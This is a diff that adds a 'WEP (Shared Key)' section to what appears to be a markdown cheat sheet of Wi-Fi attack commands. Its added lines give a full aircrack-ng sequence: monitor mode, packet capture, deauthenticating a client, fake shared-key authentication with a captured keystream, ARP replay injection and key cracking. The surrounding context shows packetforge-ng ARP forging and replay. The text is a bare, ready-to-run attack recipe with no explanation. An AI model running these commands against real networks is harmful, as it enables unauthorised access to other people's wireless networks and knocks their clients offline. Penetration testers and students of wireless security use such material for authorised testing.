@@ -42,3 +42,14 @@ aireplay-ng -4 -b <AP MAC> -h <Source MAC> <interface>
 packetforge-ng -0 -a $AP -h $MON -l 192.168.1.113 -k 192.168.1.255 -y replay_dec-1110-163209.xor -w arp.pcap
 aireplay-ng -2 -r arp.pcap mon0
 ```
+
+### WEP (Shared Key)
+```
+airmon-ng start <interface> <AP channel>
+airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
+aireplay-ng -0 1 -a <AP MAC> -c <MACCLIENT> <interface name>
+aireplay-ng -1 60 -e NETGEAR -y wepshared-01-00-24-B2-E1-C2-89.xor -a $AP -h 00:c0:ca:98:62:71 wlan0mon
+aireplay-ng -3 -b <AP MAC> -h <Source MAC> <interface name>
+aireplay-ng -0 1 -a <AP MAC> -c <MACCLIENT> <interface name>
+aircrack-ng -z <capture filename> 
+```
